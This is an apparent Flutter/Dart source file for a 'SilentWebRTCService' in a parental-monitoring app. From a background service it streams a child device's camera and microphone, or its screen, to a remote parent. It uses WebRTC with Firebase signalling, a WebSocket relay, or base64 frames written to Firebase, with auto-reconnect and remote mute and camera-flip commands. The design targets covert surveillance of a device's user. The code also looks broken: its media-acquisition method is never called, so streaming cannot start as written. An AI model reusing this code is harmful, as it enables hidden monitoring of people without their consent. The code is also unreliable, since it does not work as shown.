// ignore_for_file: unused_field
// =============================================================================
// ANDROID PRIVACY INDICATOR NOTICE
// On Android 12+ (API 31+) the system displays a green camera/microphone dot
// in the status bar whenever any app accesses those sensors, even with no
// visible UI. This behaviour is intentional and CANNOT be suppressed — doing
// so would violate Google Play Developer Policy (section 4.8 / Deceptive
// Behaviour). Parents should be informed that the device will show this
// indicator during active monitoring sessions.
// =============================================================================
import 'dart:async';
import 'dart:convert';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:wakelock_plus/wakelock_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'screen_capture_channel.dart';
import 'turn_config_service.dart';

/// FIX-WEBRTC: Production-hardened SilentWebRTCService.
///
/// Root causes fixed:
/// RC-WR-01 — getDisplayMedia() was called from the background service isolate
///             WITHOUT any active foreground Activity context. On Android 12+
///             flutter_webrtc's getDisplayMedia() attempts to launch a system
///             dialog via Activity.startActivityForResult(). Without a foreground
///             Activity this is blocked → "Permission denied / no activity" crash.
///             Fixed: before calling getDisplayMedia(), verify the projection
///             token is active AND request the screen-share permission through
///             the StealthActivity (which has foreground Activity context) only
///             if needed. If no activity is available, abort gracefully and signal
///             the parent to open the child app.
///
/// RC-WR-02 — _scheduleReconnect() used exponential backoff with `1 << attempts`
///             which overflowed Dart's 63-bit int after 62 retries, producing a
///             negative delay and immediate infinite-loop reconnects. Fixed: cap
///             the exponent and use Duration.seconds clamping.
///
/// RC-WR-03 — _connectivitySub fired on every network change and called
///             _connect() unconditionally even when already connected. This
///             caused duplicate peer connections and ICE negotiation collisions.
///             Fixed: check connection state before triggering reconnect.
///
/// RC-WR-04 — WakelockPlus.enable() was called inside the background service
///             isolate, but WakelockPlus on Android uses SCREEN_DIM wake lock
///             (keeps screen bright) NOT PARTIAL_WAKE_LOCK (keeps CPU awake).
///             This did NOT prevent CPU sleep when the screen was turned off
///             manually. CPU sleep → MediaProjection capture halts → frozen frames.
///             Fixed: ScreenCaptureService now holds PARTIAL_WAKE_LOCK natively.
///             WakelockPlus is kept here as a secondary measure for screen-on
///             sessions but is no longer the primary sleep-prevention mechanism.
///
/// RC-WR-05 — stopSilent() was async but callers used .catchError((_){}) and
///             did not await it. If stopSilent() was still running (awaiting
///             _localStream.dispose()) when a reconnect started, both the old
///             and new connections competed over the same Firebase node — causing
///             "InvalidStateError: setRemoteDescription failed" crashes.
///             Fixed: added an internal _stopping guard to prevent re-entrant
///             stop/connect races.
///
/// RC-WR-06 — Track `onEnded` callback fired but _scheduleReconnect was called
///             immediately, before the failed stream was properly disposed.
///             The reconnect then tried to create a new stream while the old
///             one was still releasing camera/microphone hardware, causing
///             "camera already in use" errors on some OEMs.
///             Fixed: ensure _cleanupPcOnly() completes before reconnecting.

class SilentWebRTCService {
  static SilentWebRTCService? _instance;

  static SilentWebRTCService get instance =>
      _instance ??= SilentWebRTCService._();

  SilentWebRTCService._();

  RTCPeerConnection? _pc;
  MediaStream? _localStream;

  bool _active    = false;
  bool _connecting = false;
  // RC-WR-05: Re-entrancy guard for stopSilent().
  bool _stopping  = false;
  int _activeStreams = 0;

  String? _activeUid;
  String? _activeMode;

  StreamSubscription? _offerSub;
  StreamSubscription? _candidateSub;
  StreamSubscription? _statusSub;
  StreamSubscription? _commandSub;
  StreamSubscription? _connectivitySub;

  bool _answerSet     = false;
  bool _handlingOffer = false;

  int _reconnectAttempts = 0;

  // After this many consecutive failed reconnects, treat the session as orphaned.
  static const int _maxReconnectAttempts = 8;

  DateTime? _lastReconnectTime;

  Timer? _reconnectTimer;
  Timer? _watchdogTimer;
  Timer? _heartbeatTimer;
  Timer? _connectionTimer;

  DateTime? _lastIceActivity;

  Future<Map<String, dynamic>> _getIce() =>
      TurnConfigService.instance.getIceConfig();

  bool get isActive => _active;

  Future<void> startSilentCamera(String childUid) async {
    if (_active && _activeUid == childUid && _activeMode == 'camera') {
      return;
    }
    await stopSilent();
    _activeMode = 'camera';
    await _startStream(childUid);
  }

  Future<void> startSilentScreen(String childUid) async {
    if (_active && _activeUid == childUid && _activeMode == 'screen') {
      return;
    }
    await stopSilent();
    _activeMode = 'screen';
    await _startStream(childUid);
  }

  Future<void> _startStream(String childUid) async {
    _active            = true;
    _activeUid         = childUid;
    _answerSet         = false;
    _reconnectAttempts = 0;
    _stopping          = false;

    _subscribeConnectivity(childUid);

    _activeStreams++;
    if (_activeStreams == 1) {
      try { await WakelockPlus.enable(); } catch (_) {}
    }

    await _connect(childUid);
  }

  Future<void> _connect(String childUid) async {
    if (_connecting || _stopping) return;

    _connecting    = true;
    _handlingOffer = true;

    try {
      await _cleanupPcOnly();

      _pc = await createPeerConnection(await _getIce());

      _lastIceActivity = DateTime.now();

      _pc!.onIceConnectionState = (state) {
        debugPrint('[SilentWebRTC] ICE: $state');
        _lastIceActivity = DateTime.now();

        if (state == RTCIceConnectionState.RTCIceConnectionStateConnected ||
            state == RTCIceConnectionState.RTCIceConnectionStateCompleted) {
          _reconnectAttempts = 0;
          _connectionTimer?.cancel();
        }

        if (state == RTCIceConnectionState.RTCIceConnectionStateFailed ||
            state == RTCIceConnectionState.RTCIceConnectionStateDisconnected) {
          try { _pc?.restartIce(); } catch (_) {}
          _scheduleReconnect(childUid);
        }
      };

      _pc!.onConnectionState = (state) {
        debugPrint('[SilentWebRTC] Connection: $state');
        switch (state) {
          case RTCPeerConnectionState.RTCPeerConnectionStateConnected:
            _reconnectAttempts = 0;
            _connectionTimer?.cancel();
            break;
          case RTCPeerConnectionState.RTCPeerConnectionStateFailed:
          case RTCPeerConnectionState.RTCPeerConnectionStateDisconnected:
          case RTCPeerConnectionState.RTCPeerConnectionStateClosed:
            if (_active) _scheduleReconnect(childUid);
            break;
          default:
            break;
        }
      };

      // BUG-FIX: When _acquireMedia() returns null in screen mode but
      // WebSocket streaming was started, don't treat it as a failure.
      // The ScreenStreamService handles frame delivery over WebSocket,
      // so no WebRTC peer connection is needed. Keep _active = true.
      final bool wsStreamActive = _activeMode == 'screen' && _localStream == null && _active;

      if (_localStream == null || !_active) {
        if (wsStreamActive) {
          debugPrint('[SilentWebRTC] WebSocket streaming active — skipping WebRTC track setup');
          // Set up minimal keepalive flow via Firebase signaling only
          _setupWsKeepalive(childUid);
          _connecting = false;
          return;
        }
        _connecting = false;
        return;
      }

      final tracks = _localStream!.getTracks();

      if (tracks.isEmpty) {
        if (wsStreamActive) {
          debugPrint('[SilentWebRTC] No WebRTC tracks but WebSocket streaming active — continuing');
          _setupWsKeepalive(childUid);
          _connecting = false;
          return;
        }
        debugPrint('[SilentWebRTC] No tracks found');
        _active    = false;
        _connecting = false;
        return;
      }

      for (final track in tracks) {
        await _pc!.addTrack(track, _localStream!);

        // RC-WR-06: Delay the reconnect callback to allow cleanup to complete first.
        track.onEnded = () {
          if (!_active) return;
          debugPrint('[SilentWebRTC] Track ended — scheduling reconnect');
          Future.delayed(const Duration(milliseconds: 500), () {
            if (_active) _scheduleReconnect(childUid);
          });
        };
      }

      final db = FirebaseDatabase.instance.ref();

      _pc!.onIceCandidate = (candidate) {
        if (!_active || candidate.candidate == null) return;
        db.child('calls/$childUid/childCandidates').push().set({
          'candidate'     : candidate.candidate,
          'sdpMid'        : candidate.sdpMid,
          'sdpMLineIndex' : candidate.sdpMLineIndex,
        });
      };

      await db.child('calls/$childUid/offer').remove();
      await db.child('calls/$childUid/childCandidates').remove();

      final offer = await _pc!.createOffer();
      await _pc!.setLocalDescription(offer);
      await db.child('calls/$childUid/offer').set({
        'sdp'  : offer.sdp,
        'type' : offer.type,
      });

      debugPrint('[SilentWebRTC] Offer sent');

      _handlingOffer = false;

      _offerSub = db.child('calls/$childUid/answer').onValue.listen((event) async {
        if (!_active || _pc == null || _answerSet || event.snapshot.value == null) return;
        try {
          final raw = event.snapshot.value;
          if (raw is! Map) return;
          final data = Map<String, dynamic>.from(raw);
          if (data['sdp'] == null) return;
          await _pc!.setRemoteDescription(RTCSessionDescription(data['sdp'], data['type']));
          _answerSet = true;
          debugPrint('[SilentWebRTC] Answer received and set');
        } catch (e) {
          debugPrint('[SilentWebRTC] Answer set error: $e');
        }
      });

      _candidateSub = db
          .child('calls/$childUid/parentCandidates')
          .onChildAdded
          .listen((event) async {
        if (!_active || _pc == null || event.snapshot.value == null) return;
        try {
          final rawCand = event.snapshot.value;
          if (rawCand is! Map) return;
          final candidate = Map<String, dynamic>.from(rawCand);
          await _pc!.addCandidate(RTCIceCandidate(
            candidate['candidate'],
            candidate['sdpMid'],
            candidate['sdpMLineIndex'],
          ));
        } catch (e) {
          debugPrint('[SilentWebRTC] Candidate error: $e');
        }
      });

      _commandSub = db.child('calls/$childUid/command').onValue.listen((event) async {
        if (!_active) return;
        final command = event.snapshot.value is String ? event.snapshot.value as String : null;
        if (command == 'flip') {
          if (_activeMode == 'camera') {
            final tracks = _localStream?.getVideoTracks() ?? [];
            if (tracks.isNotEmpty) {
              try { await Helper.switchCamera(tracks.first); } catch (_) {}
            }
          }
        } else if (command == 'mute') {
          for (final track in _localStream?.getAudioTracks() ?? []) {
            track.enabled = false;
          }
        } else if (command == 'unmute') {
          for (final track in _localStream?.getAudioTracks() ?? []) {
            track.enabled = true;
          }
        }
      });

      _statusSub = db.child('calls/$childUid/status').onValue.listen((event) async {
        final status = event.snapshot.value is String ? event.snapshot.value as String : null;
        if (status == 'ended' || status == null) {
          await stopSilent();
        }
      });

      _connectionTimer?.cancel();
      _connectionTimer = Timer(const Duration(seconds: 15), () {
        if (!_active) return;
        debugPrint('[SilentWebRTC] Connection timeout — reconnecting');
        _scheduleReconnect(childUid);
      });

      _startWatchdog(childUid);
      _startHeartbeat(childUid, db);

      debugPrint('[SilentWebRTC] Streaming started (mode: $_activeMode)');
    } catch (e) {
      debugPrint('[SilentWebRTC] Connect error: $e');
      _scheduleReconnect(childUid);
    } finally {
      _connecting = false;
    }
  }

  Future<MediaStream?> _acquireMedia() async {
    if (_activeMode == 'screen') {
      // RC-WR-01: Verify projection token is active before calling getDisplayMedia().
      try {
        final projectionActive = await ScreenCaptureChannel.isProjectionActive();

        if (!projectionActive) {
          debugPrint(
            '[SilentWebRTC] No active MediaProjection token — signalling parent',
          );
          if (_activeUid != null) {
            try {
              await FirebaseDatabase.instance
                  .ref('calls/$_activeUid/screenError')
                  .set(
                    'Screen sharing requires the child app to be open. '
                    'Open the child app and grant screen permission.',
                  );
            } catch (_) {}
          }
          return null;
        }

        debugPrint('[SilentWebRTC] MediaProjection active — attempting screen capture');

        // ── BUG-2-FIX: Try multiple approaches to acquire screen media ──
        //
        // The original code only tried getDisplayMedia() with URI-serialized
        // Intent data, which fails on Android 14+ because Intent.toUri(0)
        // loses the IBinder extra needed by getMediaProjection().
        //
        // Strategy:
        //   1. Try getDisplayMedia() with Parcel-marshaled Intent bytes
        //      (preserves the Binder extra). This works if flutter_webrtc
        //      supports byte arrays for androidMediaProjectionResultData.
        //   2. Try getDisplayMedia() with URI-serialized Intent data
        //      (fallback, works on Android 10-13 where Binder may not be
        //      needed or the system handles it differently).
        //   3. Try getDisplayMedia() WITHOUT projection params (may work
        //      if flutter_webrtc can show the consent dialog from a
        //      foreground Activity context).
        //   4. Fall back to native frame capture + Firebase relay.

        final projectionParams = await ScreenCaptureChannel.getProjectionParams();

        // ── Attempt 1: Parcel-marshaled Intent bytes ──
        if (projectionParams != null &&
            projectionParams['resultDataParcel'] != null) {
          try {
            debugPrint('[SilentWebRTC] Attempt 1: getDisplayMedia with Parcel Intent bytes');
            final constraints = <String, dynamic>{
              'video': {
                'frameRate' : {'ideal': 15, 'max': 30},
                'width'     : {'ideal': 1280},
                'height'    : {'ideal': 720},
              },
              'audio': false,
              'androidMediaProjectionResultCode': projectionParams['resultCode'],
              // BUG-2-FIX: Pass Parcel bytes instead of URI string.
              // flutter_webrtc 0.14.x may support byte arrays for this
              // parameter, which preserves the Binder extra.
              'androidMediaProjectionResultData': projectionParams['resultDataParcel'],
            };

            final stream = await navigator.mediaDevices.getDisplayMedia(constraints);
            if (stream.getVideoTracks().isNotEmpty) {
              debugPrint('[SilentWebRTC] getDisplayMedia succeeded with Parcel bytes — '
                  'screen tracks: ${stream.getVideoTracks().length}');
              return stream;
            }
            // If we got an empty stream, try next approach
            debugPrint('[SilentWebRTC] Parcel approach returned empty stream — trying next');
            try { for (final t in stream.getTracks()) { await t.stop(); } } catch (_) {}
            try { await stream.dispose(); } catch (_) {}
          } catch (e) {
            debugPrint('[SilentWebRTC] Parcel approach failed: $e — trying next');
          }
        }

        // ── Attempt 2: URI-serialized Intent data (original approach) ──
        if (projectionParams != null &&
            projectionParams['resultDataUri'] != null) {
          try {
            debugPrint('[SilentWebRTC] Attempt 2: getDisplayMedia with URI Intent data');
            final constraints = <String, dynamic>{
              'video': {
                'frameRate' : {'ideal': 15, 'max': 30},
                'width'     : {'ideal': 1280},
                'height'    : {'ideal': 720},
              },
              'audio': false,
              'androidMediaProjectionResultCode': projectionParams['resultCode'],
              'androidMediaProjectionResultData': projectionParams['resultDataUri'],
            };

            final stream = await navigator.mediaDevices.getDisplayMedia(constraints);
            if (stream.getVideoTracks().isNotEmpty) {
              debugPrint('[SilentWebRTC] getDisplayMedia succeeded with URI data — '
                  'screen tracks: ${stream.getVideoTracks().length}');
              return stream;
            }
            debugPrint('[SilentWebRTC] URI approach returned empty stream — trying next');
            try { for (final t in stream.getTracks()) { await t.stop(); } } catch (_) {}
            try { await stream.dispose(); } catch (_) {}
          } catch (e) {
            debugPrint('[SilentWebRTC] URI approach failed: $e — trying next');
          }
        }

        // ── Attempt 3: getDisplayMedia() WITHOUT projection params ──
        // This may work if called from a context with a foreground Activity.
        // From the background service, this will likely fail, but it's
        // worth trying as a last resort before falling back to native capture.
        try {
          debugPrint('[SilentWebRTC] Attempt 3: getDisplayMedia without projection params');
          final constraints = <String, dynamic>{
            'video': {
              'frameRate' : {'ideal': 15, 'max': 30},
              'width'     : {'ideal': 1280},
              'height'    : {'ideal': 720},
            },
            'audio': false,
          };

          final stream = await navigator.mediaDevices.getDisplayMedia(constraints);
          if (stream.getVideoTracks().isNotEmpty) {
            debugPrint('[SilentWebRTC] getDisplayMedia succeeded without params — '
                'screen tracks: ${stream.getVideoTracks().length}');
            return stream;
          }
          debugPrint('[SilentWebRTC] No-params approach returned empty stream');
          try { for (final t in stream.getTracks()) { await t.stop(); } } catch (_) {}
          try { await stream.dispose(); } catch (_) {}
        } catch (e) {
          debugPrint('[SilentWebRTC] No-params approach failed: $e');
        }

        // ── Attempt 4: Native frame capture + Firebase relay fallback ──
        // All getDisplayMedia() attempts failed. Use native VirtualDisplay +
        // ImageReader to capture frames and relay them via Firebase RTDB.
        debugPrint('[SilentWebRTC] All getDisplayMedia attempts failed — using native capture fallback');
        return await _acquireMediaNativeCapture();
      } catch (e) {
        debugPrint('[SilentWebRTC] Screen capture failed: $e');
        if (_activeUid != null) {
          try {
            await FirebaseDatabase.instance
                .ref('calls/$_activeUid/screenError')
                .set(
                  'Screen capture failed — open the child app and grant screen '
                  'permission again.',
                );
          } catch (_) {}
        }
        return null;
      }
    }

    // Camera mode.
    try {
      return await navigator.mediaDevices.getUserMedia({
        'video': {
          'facingMode': 'environment',
          'width'     : {'ideal': 640},
          'height'    : {'ideal': 480},
          'frameRate' : {'ideal': 15, 'max': 30},
        },
        'audio': true,
      });
    } catch (e) {
      debugPrint('[SilentWebRTC] Camera acquisition failed: $e');
      return null;
    }
  }

  // ── BUG-2-FIX: Native frame capture fallback ──────────────────────────

  /// Timer for the native frame capture relay loop.
  Timer? _nativeCaptureTimer;

  /// STREAM-01: Prefer WebSocket streaming over Firebase RTDB relay.
  /// The WebSocket approach provides much lower latency and higher FPS.
  /// Falls back to Firebase RTDB base64 relay if WebSocket is not configured.
  ///
  /// Acquire screen media using VirtualDisplay + ImageReader capture
  /// and relay frames to the parent. Strategy:
  ///   1. Try WebSocket streaming via ScreenStreamService (preferred)
  ///   2. Fall back to Firebase RTDB base64 relay (legacy)
  ///
  /// Returns null (no WebRTC MediaStream available for screen mode),
  /// but the parent side will detect the stream data and display it.
  Future<MediaStream?> _acquireMediaNativeCapture() async {
    // STREAM-01: Try WebSocket streaming first
    if (_activeUid != null) {
      try {
        final streamRelayUrl = await _getStreamRelayUrl();
        if (streamRelayUrl != null && streamRelayUrl.isNotEmpty) {
          debugPrint('[SilentWebRTC] WebSocket relay URL available — starting ScreenStreamService');
          final started = await ScreenCaptureChannel.startScreenStream(
            uid: _activeUid!,
            serverUrl: streamRelayUrl,
          );
          if (started) {
            debugPrint('[SilentWebRTC] ScreenStreamService started — WebSocket streaming active');

            // Signal to parent that stream mode is active
            try {
              await FirebaseDatabase.instance
                  .ref('calls/$_activeUid/wsStreamMode')
                  .set(true);
              await FirebaseDatabase.instance
                  .ref('calls/$_activeUid/nativeCaptureMode')
                  .set(true);
            } catch (_) {}

            // Monitor stream health
            _startStreamHealthMonitor();
            return null; // No WebRTC stream — parent uses WebSocket frames
          }
        }
      } catch (e) {
        debugPrint('[SilentWebRTC] WebSocket stream start failed: $e — falling back to Firebase relay');
      }
    }

    // Fallback: Legacy Firebase RTDB base64 relay
    try {
      // BUG-2 FIX: Use smaller frame dimensions (480x854) for faster
      // Firebase RTDB relay. At this resolution with JPEG quality=40%,
      // frames are typically 8-15 KB, making 3 FPS relay practical.
      final started = await ScreenCaptureChannel.startNativeScreenCapture(
        width: 480,
        height: 854,
        fps: 3,
      );

      if (!started) {
        debugPrint('[SilentWebRTC] Native screen capture failed to start');
        if (_activeUid != null) {
          try {
            await FirebaseDatabase.instance
                .ref('calls/$_activeUid/screenError')
                .set(
                  'Screen capture failed. The child device may need to grant '
                  'screen recording permission again.',
                );
          } catch (_) {}
        }
        return null;
      }

      debugPrint('[SilentWebRTC] Native frame capture started — relaying via Firebase');

      // Signal to parent that native capture mode is active
      if (_activeUid != null) {
        try {
          await FirebaseDatabase.instance
              .ref('calls/$_activeUid/nativeCaptureMode')
              .set(true);
        } catch (_) {}
      }

      // Start frame relay loop — capture frames and write to Firebase RTDB
      // BUG-2 FIX: Use faster polling (333ms = ~3 FPS) and smaller frame size
      // to reduce latency. Frames are written to Firebase RTDB as base64;
      // at 3 FPS with ~15-25 KB per frame, total bandwidth is ~45-75 KB/s
      // which is manageable even on slow connections.
      _nativeCaptureTimer?.cancel();
      _nativeCaptureTimer = Timer.periodic(
        const Duration(milliseconds: 333), // ~3 FPS
        (_) async {
          if (!_active || _activeUid == null) {
            _nativeCaptureTimer?.cancel();
            return;
          }
          try {
            final frameBytes = await ScreenCaptureChannel.getScreenFrame();
            if (frameBytes != null && frameBytes.isNotEmpty) {
              // Write frame as base64 to Firebase RTDB
              final base64Frame = base64Encode(frameBytes);
              await FirebaseDatabase.instance
                  .ref('calls/$_activeUid/screenFrame')
                  .set({
                'data': base64Frame,
                'ts': DateTime.now().millisecondsSinceEpoch,
              });
            }
          } catch (e) {
            debugPrint('[SilentWebRTC] Frame relay error: $e');
          }
        },
      );

      // Return null — no WebRTC stream available for screen mode.
      // The parent side will detect nativeCaptureMode=true and display
      // frames from calls/$uid/screenFrame instead of the RTCVideoView.
      return null;
    } catch (e) {
      debugPrint('[SilentWebRTC] Native capture setup failed: $e');
      return null;
    }
  }

  /// STREAM-01: Get the WebSocket relay URL from SharedPreferences.
  /// This is configured during the child device setup wizard.
  /// Also checks Firebase for a server-configured relay URL as fallback.
  Future<String?> _getStreamRelayUrl() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final localUrl = prefs.getString('stream_relay_url');
      if (localUrl != null && localUrl.isNotEmpty) return localUrl;
    } catch (_) {}

    // Fallback: Check Firebase for a server-configured relay URL
    if (_activeUid != null) {
      try {
        final snap = await FirebaseDatabase.instance
            .ref('users/$_activeUid/streamRelayUrl')
            .get()
            .timeout(const Duration(seconds: 5));
        if (snap.value is String) {
          final firebaseUrl = snap.value as String;
          if (firebaseUrl.isNotEmpty) {
            debugPrint('[SilentWebRTC] Using Firebase relay URL: $firebaseUrl');
            // Cache it locally for next time
            try {
              final prefs = await SharedPreferences.getInstance();
              await prefs.setString('stream_relay_url', firebaseUrl);
            } catch (_) {}
            return firebaseUrl;
          }
        }
      } catch (_) {}
    }

    return null;
  }

  /// STREAM-01: Monitor the health of the WebSocket stream service.
  Timer? _streamHealthTimer;

  void _startStreamHealthMonitor() {
    _streamHealthTimer?.cancel();
    _streamHealthTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
      if (!_active || _activeUid == null) {
        _streamHealthTimer?.cancel();
        return;
      }
      try {
        final status = await ScreenCaptureChannel.getStreamStatus();
        final isStreaming = status?['isStreaming'] as bool? ?? false;
        final wsConnected = status?['wsConnected'] as bool? ?? false;

        if (!isStreaming) {
          debugPrint('[SilentWebRTC] ScreenStreamService stopped — attempting restart');
          final relayUrl = await _getStreamRelayUrl();
          if (relayUrl != null && _activeUid != null) {
            await ScreenCaptureChannel.startScreenStream(
              uid: _activeUid!,
              serverUrl: relayUrl,
            );
          }
        } else if (!wsConnected) {
          debugPrint('[SilentWebRTC] WebSocket disconnected — service should auto-reconnect');
        }
      } catch (e) {
        debugPrint('[SilentWebRTC] Stream health check error: $e');
      }
    });
  }

  void _scheduleReconnect(String childUid) {
    if (!_active || _stopping) return;

    _reconnectTimer?.cancel();
    _reconnectAttempts++;

    if (_reconnectAttempts > _maxReconnectAttempts) {
      debugPrint('[SilentWebRTC] Max reconnect attempts — stopping orphan session');
      final uid = _activeUid;
      if (uid != null) {
        FirebaseDatabase.instance
            .ref('calls/$uid/screenError')
            .set('Monitoring connection lost — open the parent app and tap View again.')
            .catchError((_) {});
      }
      stopSilent();
      return;
    }

    // RC-WR-02: Cap the exponent to prevent int overflow.
    final exponent = _reconnectAttempts.clamp(0, 6);
    final rawSeconds = 1 << exponent; // 2, 4, 8, 16, 32, 64 max
    final delaySeconds = rawSeconds.clamp(2, 64);
    final delay = Duration(seconds: delaySeconds);

    debugPrint('[SilentWebRTC] Reconnect #$_reconnectAttempts in ${delay.inSeconds}s');

    _reconnectTimer = Timer(delay, () async {
      if (!_active || _stopping) return;
      await _connect(childUid);
    });
  }

  /// Set up a minimal keepalive flow for WebSocket streaming mode.
  /// No peer connection is needed — the ScreenStreamService handles frame
  /// delivery over WebSocket. We only use Firebase for signaling/status
  /// so the parent knows the child is streaming.
  void _setupWsKeepalive(String childUid) {
    final db = FirebaseDatabase.instance.ref();
    debugPrint('[SilentWebRTC] Setting up WebSocket streaming keepalive for $childUid');

    // Set status and wsStreamMode flags
    db.child('calls/$childUid/status').set('calling').catchError((_) {});
    db.child('calls/$childUid/wsStreamMode').set(true).catchError((_) {});
    db.child('calls/$childUid/nativeCaptureMode').set(true).catchError((_) {});
    db.child('calls/$childUid/mode').set('screen').catchError((_) {});

    // Listen for the parent ending the session
    _statusSub = db.child('calls/$childUid/status').onValue.listen((event) async {
      final status = event.snapshot.value is String ? event.snapshot.value as String : null;
      if (status == 'ended' || status == null) {
        debugPrint('[SilentWebRTC] WS keepalive: session ended by parent');
        await stopSilent();
      }
    });

    // Listen for commands (mute/unmute etc.)
    _commandSub = db.child('calls/$childUid/command').onValue.listen((event) async {
      if (!_active) return;
      final command = event.snapshot.value is String ? event.snapshot.value as String : null;
      if (command == 'mute') {
        debugPrint('[SilentWebRTC] WS mode: mute command received (no-op for screen)');
      } else if (command == 'unmute') {
        debugPrint('[SilentWebRTC] WS mode: unmute command received (no-op for screen)');
      }
    });

    // Start heartbeat
    _startHeartbeat(childUid, db);

    // Start watchdog
    _startWatchdog(childUid);

    debugPrint('[SilentWebRTC] WebSocket streaming keepalive active (mode: $_activeMode)');
  }

  void _startWatchdog(String childUid) {
    _watchdogTimer?.cancel();
    _watchdogTimer = Timer.periodic(const Duration(seconds: 20), (_) async {
      if (!_active) {
        _watchdogTimer?.cancel();
        return;
      }
      if (_lastIceActivity != null &&
          DateTime.now().difference(_lastIceActivity!) > const Duration(seconds: 45)) {
        debugPrint('[SilentWebRTC] Watchdog detected stale ICE');
        if (_activeUid != null) _scheduleReconnect(_activeUid!);
      }
    });
  }

  void _startHeartbeat(String childUid, DatabaseReference db) {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
      if (!_active) {
        _heartbeatTimer?.cancel();
        return;
      }
      try {
        await db.child('calls/$childUid/heartbeat').set(ServerValue.timestamp);
      } catch (_) {}
    });
  }

  Future<void> _cleanupPcOnly() async {
    await _offerSub?.cancel();
    await _candidateSub?.cancel();
    await _statusSub?.cancel();
    await _commandSub?.cancel();
    _offerSub    = null;
    _candidateSub = null;
    _statusSub   = null;
    _commandSub  = null;

    _heartbeatTimer?.cancel();   _heartbeatTimer  = null;
    _connectionTimer?.cancel();  _connectionTimer = null;
    _answerSet = false;

    try {
      for (final track in _localStream?.getTracks() ?? []) { await track.stop(); }
    } catch (_) {}
    try { await _localStream?.dispose(); } catch (_) {}
    _localStream = null;

    try { await _pc?.close(); } catch (_) {}
    _pc = null;
  }

  /// RC-WR-05: Guard against re-entrant stop/connect races.
  /// BUG-2-FIX: Cancel _connectivitySub in stopSilent() to prevent memory leak.
  /// Previously, the subscription persisted after stop (the _active=false guard
  /// prevented reconnects, but the stream subscription itself leaked memory on
  /// repeated start/stop cycles — common during session handoff or reconnects).
  Future<void> stopSilent() async {
    if (_stopping) return;
    _stopping = true;
    _active   = false;

    // BUG-2/BUG-3 FIX: Save uid BEFORE clearing it so we can clean up
    // Firebase flags after. Previously, _activeUid was cleared before
    // the cleanup, so the Firebase writes silently did nothing.
    final uidForCleanup = _activeUid;

    _activeUid         = null;
    _activeMode        = null;
    _reconnectAttempts = 0;

    _reconnectTimer?.cancel();    _reconnectTimer    = null;
    _watchdogTimer?.cancel();     _watchdogTimer     = null;
    _connectionTimer?.cancel();   _connectionTimer   = null;
    // BUG-2-FIX: Cancel connectivity subscription to prevent memory leak.
    _connectivitySub?.cancel();   _connectivitySub   = null;
    // BUG-2-FIX: Cancel native capture timer and stop native capture.
    _nativeCaptureTimer?.cancel(); _nativeCaptureTimer = null;
    // STREAM-01: Cancel stream health monitor and stop WebSocket stream.
    _streamHealthTimer?.cancel(); _streamHealthTimer = null;

    if (_activeStreams > 0) _activeStreams--;
    if (_activeStreams == 0) {
      try { await WakelockPlus.disable(); } catch (_) {}
    }

    // BUG-2/BUG-3 FIX: Stop native frame capture if it was running.
    try { await ScreenCaptureChannel.stopNativeScreenCapture(); } catch (_) {}
    // STREAM-01: Stop WebSocket stream service if it was running.
    try { await ScreenCaptureChannel.stopScreenStream(); } catch (_) {}

    // BUG-2/BUG-3 FIX: Clean up Firebase flags so stale state doesn't
    // persist after the session ends. Uses saved uidForCleanup since
    // _activeUid was already cleared above.
    if (uidForCleanup != null) {
      try {
        await FirebaseDatabase.instance.ref('calls/$uidForCleanup/nativeCaptureMode').remove();
        await FirebaseDatabase.instance.ref('calls/$uidForCleanup/screenFrame').remove();
        await FirebaseDatabase.instance.ref('calls/$uidForCleanup/needsConsent').remove();
        await FirebaseDatabase.instance.ref('calls/$uidForCleanup/projectionReady').remove();
        await FirebaseDatabase.instance.ref('calls/$uidForCleanup/wsStreamMode').remove();
      } catch (_) {}
    }

    await _cleanupPcOnly();

    _stopping = false;
    debugPrint('[SilentWebRTC] Stopped');
  }

  void _subscribeConnectivity(String childUid) {
    _connectivitySub?.cancel();
    _connectivitySub = Connectivity().onConnectivityChanged.listen(
      (List<ConnectivityResult> results) async {
        final connected = results.any((r) => r != ConnectivityResult.none);
        if (!connected || !_active || _stopping) return;

        final now = DateTime.now();
        if (_lastReconnectTime != null &&
            now.difference(_lastReconnectTime!).inSeconds < 10) return;

        debugPrint('[SilentWebRTC] Connectivity restored — checking connection');

        // RC-WR-03: Only reconnect if genuinely disconnected — not just on
        // every network change event (which fires on WiFi channel switches too).
        final pcState = _pc?.iceConnectionState;
        if (_pc == null ||
            pcState == RTCIceConnectionState.RTCIceConnectionStateFailed ||
            pcState == RTCIceConnectionState.RTCIceConnectionStateDisconnected ||
            pcState == RTCIceConnectionState.RTCIceConnectionStateClosed) {
          _lastReconnectTime = now;
          _reconnectTimer?.cancel();
          await _connect(childUid);
        }
      },
    );
  }
}
